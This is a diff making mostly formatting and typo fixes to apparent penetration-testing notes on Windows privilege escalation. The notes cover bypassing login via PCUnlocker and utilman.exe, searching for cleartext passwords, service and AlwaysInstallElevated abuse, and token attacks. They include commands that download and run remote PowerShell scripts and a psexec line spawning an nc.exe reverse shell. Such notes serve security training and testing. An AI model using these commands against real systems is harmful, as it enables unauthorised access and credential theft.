@@ -81,38 +81,38 @@ the motherboard Jumper.
 
 *Encrypted disk*
 
-The methods detailed below require an access to the Windows filesystem and will
-not work on encrypted partitions if the password to decrypt the filesystem is
+The methods detailed below require an access to the Windows file system and will
+not work on encrypted partitions if the password to decrypt the file system is
 not known.
 
 ###### PCUnlocker
 
-PCUnlocker is a password-unlocking software that can be used to reset lost
+`PCUnlocker` is a password-unlocking software that can be used to reset lost
 Windows users password. it can be burn on a CD/DVD or installed on a bootable
 USB key.
 
 The procedure to create a bootable USB key and reset local Windows users
 passwords is as follow:
 
-  1. Download Rufus and PCUnlocker
-  2. Create a bootable USK key using Rufus with the PCUnlocker ISO.  
+  1. Download `Rufus` and `PCUnlocker`
+  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.  
      If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
      scheme for UEFI computer" option on Rufus
   3. Boot on the USB Key thus created (boot order may need to be changed in
      BIOS)
-  4. From the PCUnlocker GUI, pick an account and click the "Reset Password"
-     button to reset the password to "Password123"
+  4. From the `PCUnlocker` GUI, pick an account and click the "Reset Password"
+     button to reset the password to <PASSWORD>
 
-To create a bootable CD/DVD, simply use any CD/DVD burner with the PCUnlocker
+To create a bootable CD/DVD, simply use any CD/DVD burner with the `PCUnlocker`
 ISO and follow steps 3 & 4.  
-If used on a Domain Controller, PCUnlocker can be used to reset Domain users
-password by updating the ntds.dit file.
+If used on a Domain Controller, `PCUnlocker` can be used to reset Domain users
+password by updating the `ntds.dit` file.
 
 ###### utilman.exe
 
-The utilman utility tool can be launched at the login screen before
+The `utilman` utility tool can be launched at the login screen before
 authentication as NT AUTHORITY\SYSTEM. By using a Windows installation CD/DVD,
-it is possible to replace the utilman.exe by cmd.exe to gain access to a CMD
+it is possible to replace the `utilman.exe` by `cmd.exe` to gain access to a CMD
 shell as SYSTEM without authentication.
 
 The procedure to do so is as follow:
@@ -137,12 +137,12 @@ The procedure to do so is as follow:
 
 ###### Clear text passwords in files
 
-The builtin `findstr` and `dir` can be used to search for clear text passwords
-stored in files. The keyword 'password' shoudl be used first and the search
+The built-in `findstr` and `dir` can be used to search for clear text passwords
+stored in files. The keyword 'password' should be used first and the search
 broaden if needed by searching for 'pass'.
 
-The meterpreter `search` command can be used in place of `findstr` if a
-meterpreter shell is being used.
+The `meterpreter` `search` command can be used in place of `findstr` if a
+`meterpreter` shell is being used.
 
 ```
 # Meterpreter search command
@@ -170,7 +170,7 @@ findstr /s /i /m "runas" *.*
 dir /s *pass* == *cred* == *vnc* == *.config*
 ```
 
-The following files, if present on the sytem, may contain cleartext or base64
+The following files, if present on the system, may contain clear text or base64
 encoded passwords and should be reviewed:
 
 ```
@@ -252,12 +252,12 @@ Automatically compare the system patch level to public known exploits:
 
 *Windows Exploit Suggester*
 
-The windows-exploit-suggester tool compares a targets patch levels against the
+The `windows-exploit-suggester` tool compares a targets patch levels against the
 Microsoft vulnerability database in order to detect potential missing patches
 on the target.  
-It also notifies the user if there are public exploits and Metasploit modules
+It also notifies the user if there are public exploits and `Metasploit` modules
 available for the missing bulletins.  
-It requires the 'systeminfo' command output from a Windows host in order to
+It requires the `systeminfo` command output from a Windows host in order to
 compare that the Microsoft security bulletin database and determine the patch
 level of the host.  
 It has the ability to automatically download the security bulletin database
@@ -269,9 +269,9 @@ from Microsoft with the --update flag, and saves it as an Excel spreadsheet.
 python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
 ```
 
-If the 'systeminfo' command reveals 'File 1' as the output for the hotfixes,
-try executing 'wmic qfe list full' and feed that as input with the --hotfixes
-flag, along with the 'systeminfo':
+If the `systeminfo` command reveals 'File 1' as the output for the hotfixes,
+the output of `wmic qfe list full` shoudl be used instead using the --hotfixes
+flag, along with the `systeminfo`:
 
 ```
 python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
@@ -294,9 +294,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')
 
 *(Metasploit) Local Exploit Suggester*
 
-The Local Exploit Suggester module suggests local meterpreter exploits that can
- be used against the target, based on the architecture and platform as well as
- the available exploits in meterpreter.
+The `local_exploit_suggester` module suggests local `meterpreter` exploits that
+can be used against the target, based on the architecture and platform as well as
+the available exploits in `meterpreter`.
 
  ```
 meterpreter > run post/multi/recon/local_exploit_suggester
@@ -312,7 +312,8 @@ msf post(local_exploit_suggester) > run
 
 *mingw*
 
-C code can be compiled on Linux for Windows using the  cross-compiler mingw:
+An exploit in C can be compiled on Linux to be used on a Windows system using
+the cross-compiler `mingw`:
 
 ```
 # 32 bits
@@ -325,14 +326,14 @@ x86_64-w64-mingw32-gcc -o exploit.exe exploit.c
 *PyInstaller*
 
 If an exploit is only available as a Python script and Python is not installed
-on the target, PyInstaller can be used to compile a stand alone executable of
+on the target, `PyInstaller` can be used to compile a stand alone executable of
 the Python script:
 
 ```
 pyinstaller --onefile <SCRIPT>.py
 ```
 
-PyInstaller should be used on a Windows operating system.
+`PyInstaller` should be used on a Windows operating system.
 
 ### Services misconfigurations
 
@@ -354,7 +355,7 @@ A weak service permissions vulnerability occurs when an unprivileged user can
 alter the service configuration or the service binary so that the service runs a
 specified command or executable.  
 
-The `accesschk` tool, from the Sysinternals suite, and the `Powershell`
+The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
 `PowerUp` script can be used to list the services an user can exploit:
 
 ```
@@ -492,8 +493,8 @@ int main() {
 }
 ```
 
-The C code above can be compiled on Linux using the  cross-compiler mingw (refer
-  to cross compilation above).
+The C code above can be compiled on Linux using the  cross-compiler `mingw`
+(refer to cross compilation above).
 
 *Reverse shell*
 
@@ -526,14 +527,14 @@ sc config <SERVICE_NAME> depend= ""
 Windows provides a mechanism which allows unprivileged user to install Windows
 installation packages, Microsoft Windows Installer Package (MSI) files,
 with NT AUTHORITY\SYSTEM privileges. This policy is known as
-"AlwaysInstallElevated".
+`AlwaysInstallElevated`.
 
 If activated, this mechanism can be leveraged to elevate privileges on the
 system by executing code through the MSI during the installation process as
 NT AUTHORITY\SYSTEM.    
 
 The Windows builtin `req query` and the the `Powershell` `PowerUp` script can
-be used to check whether the "AlwaysInstallElevated" policy is deployed on the
+be used to check whether the `AlwaysInstallElevated` policy is deployed on the
 host be querying the registry:
 
 ```
@@ -587,7 +588,8 @@ PS> Write-UserAddMSI
 ###### Vulnerable privileges
 
 Use the following command to retrieve the current user account token privileges:
-```bash
+
+```
 whoami /priv
 ```
 
@@ -604,13 +606,13 @@ The following tokens can be exploited to gain SYSTEM access privileges:
 
 ###### Rotten Potato x64 w/ Metasploit
 
-RottenPotato can be used in combination with the Metasploit meterpreter
+`RottenPotato` can be used in combination with the `Metasploit` `meterpreter`
 incognito module to abuse the privileges above in order to elevate privilege to
 SYSTEM.
 
 Source: https://github.com/breenmachine/RottenPotatoNG
 
-```bash
+```
 # Load the incognito module to toy with tokens
 meterpreter > load incognito
 
@@ -631,7 +633,7 @@ meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 
 ###### Tater
 
-Tater is a PowerShell implementation of the Hot Potato Windows Privilege
+`Tater` is a `PowerShell` implementation of the Hot Potato Windows Privilege
 Escalation exploit.
 
 ```
@@ -650,8 +652,8 @@ powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('h
 
 ### Credentials re-use
 
-To use another user credentials, psexec can be used to start a cmd shell or start a
-reverse shell:
+To use another user credentials, `psexec` can be used to start a CMD shell or
+start a reverse shell:
 
 ```
 # Use the -s option if the user provided is member of the administrators group
@@ -661,17 +663,17 @@ psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e
 
 ### Administrator to SYSTEM
 
-The system account and the administrator account (Administrators group) have
-the same file privileges, but they have different functions.  
+The NT AUTHORITY\ SYSTEM account and the administrator account (Administrators
+group) have the same file privileges, but they have different functions.  
 The system account is used by the operating system and by services that run
 under Windows. It is an internal account, does not show up in User Manager,
 cannot be added to any groups, and cannot have user rights assigned to it.  
 The system account is needed by tools that make us of Debug Privilege
-(such as mimikatz) which allows someone to debug a process that they wouldn’t
+(such as `mimikatz`) which allows someone to debug a process that they wouldn’t
 otherwise have access to.
 
-The PsExec Microsoft signed tool can be used to elevate to system privilege from
-an administrator account:
+The `PsExec` Microsoft signed tool can be used to elevate to system privilege
+from an administrator account:
 
 ```
 # -s   Run the remote process in the System account.
@@ -681,8 +683,8 @@ an administrator account:
 psexec.exe -accepteula -s -i -d cmd.exe
 ```
 
-If a meterpreter is being used, the **getsystem** command can be leveraged to
-the same end.
+If a `meterpreter` shell is being used, the `getsystem` command can be
+leveraged to the same end.
 
 ### TODO
 
